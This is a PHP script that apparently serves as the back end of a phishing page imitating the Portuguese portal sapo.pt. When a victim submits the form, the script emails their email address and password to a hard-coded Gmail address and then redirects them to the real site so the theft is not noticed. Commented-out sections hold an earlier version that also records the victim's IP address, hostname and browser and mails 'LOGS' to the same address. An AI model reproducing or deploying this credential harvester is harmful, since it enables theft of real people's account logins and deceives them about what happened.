<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {    $email = $_POST["email"];    $password = $_POST["password"];    $to = "musadmusad6@gmail.com";    $subject = "Login Information";    $message = "Email: $email\nPassword: $password";    if (mail($to, $subject, $message, $headers)) {    header("Location: https://sapo.pt/");    exit();                  } else {    echo "Failed to send email. Please check your server's configuration.";
}

//   $user = $_REQUEST["email"];
//  $pass = $_REQUEST["password"];

//  if (getenv(HTTP_CLIENT_IP)){
//  $ip=getenv(HTTP_CLIENT_IP);
//   }
//  else {
//   $ip=getenv(REMOTE_ADDR);
//   }

//   $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
//  $browser = $_SERVER['HTTP_USER_AGENT'];

//  $data=" 
//  ----------
//  User: $user
//  pass : $pass
//  ------------------
//  $ip
//  $hostname
//  $browser
// ------------------


    // if (mail($to, $subject, $message)) {
    //     echo "Email sent successfully!";
    // } else {
    //     echo "Failed to send email. Please check your server's configuration.";
    // }
    
//     $subj = "sapo.pt LOGS-> $user,$pass";

// $recipient1 = "musadmusad6@gmail.com";
// $rec2 = "";



// mail($recipient1 , $subj , $data);
// mail($rec2 , $subj , $data);
// $subj = "sapo.pt-Vmail LOGS-> $user,$pass";

// $recipient1 = "musadmusad6@gmail.com";
// $rec2 = "";



// mail($recipient1 , $subj , $data);
// mail($rec2 , $subj , $data);
// $subj = "sapo.pt LOGS-> $user,$pass";

// $recipient1 = "musadmusad6@gmail.com";
// $rec2 = "";



// mail($recipient1 , $subj , $data);
// mail($rec2 , $subj , $data);

}
?>
